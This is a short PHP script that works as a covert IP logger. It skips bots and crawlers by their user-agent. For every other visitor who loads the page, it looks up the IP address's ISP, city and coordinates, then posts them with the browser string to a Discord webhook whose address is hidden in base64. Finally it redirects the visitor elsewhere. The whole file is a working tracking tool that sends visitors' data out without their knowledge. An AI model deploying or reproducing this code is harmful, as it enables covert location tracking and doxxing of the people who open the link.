<?php

$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];

if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

$Curl = curl_init("http://ip-api.com/json/$IP");
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

$ISP = $Info->isp;
$Country = $Info->country;
$Region = $Info->regionName;
$City = $Info->city;
$COORD = "$Info->lat, $Info->lon"; 

$Webhook    = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTQ4NzQ4NDk3NTE4MjE5Mzc0L0hvZkxmOFVHclZfWHVrQ3JISGdaaGV1ZGhWdkRyS0FIQzBvS2tVLUx4UWE1LXRBVzZsel8xN3dsSklvVGdnTDlSZ1k0";

$WebhookTag = "schizo.agency";


$JS = array(
    'username'   => "$WebhookTag - IP Logger" , 
    'avatar_url' => "https://vgy.me/GQe9bJ.png",
    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\n**__Location__**: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
);
 
$JSON = json_encode($JS);


function IpToWebhook($Hook, $Content)
{
      $Curl = curl_init($Hook);
      curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
      curl_setopt($Curl, CURLOPT_POSTFIELDS, $Content);
      curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
      return curl_exec($Curl);
}

IpToWebhook(base64_decode($Webhook), $JSON);
header("Location: https://www.terrorist.solutions");
?>
